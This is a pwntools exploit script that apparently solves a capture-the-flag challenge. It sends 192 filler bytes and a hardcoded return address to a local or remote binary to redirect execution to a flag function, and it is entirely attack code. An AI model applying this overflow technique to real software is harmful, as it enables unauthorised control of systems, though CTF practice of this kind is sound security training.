#!/bin/python3

import sys
import argparse

from pwn import *

def arg_parse():
    parser = argparse.ArgumentParser(description='pwn script')
    parser.add_argument('-b', '--bin', default='', dest='bin', help='executable file')
    parser.add_argument('-a', '--address', default='', dest='addr', help='remote address')
    parser.add_argument('-d', '--debug', action='store_true', dest='debug', help='open in gdb')
    return parser

def exploit(process):
    flag_addr = p32(0x80491e6)
    filler = ("A" * 192).encode()

    process.recvuntil(b'You know who are 0xDiablos:')
    process.sendline(filler + flag_addr)

    while True: 
        try:
            print(process.recvline())
        except EOFError:
            break


if __name__ == '__main__':
    parser = arg_parse()
    args = parser.parse_args()
    if len(args.addr) != 0 :
        host = args.addr.split()[0]
        port = args.addr.split()[1]
        process = remote(host, port)
    elif len(args.bin) != 0:
        if args.debug:
            process = gdb.debug(f'./{args.bin}', 'b main')
        else:
            process = process(f'./{args.bin}')
    else:
        parser.print_usage()

    exploit(process)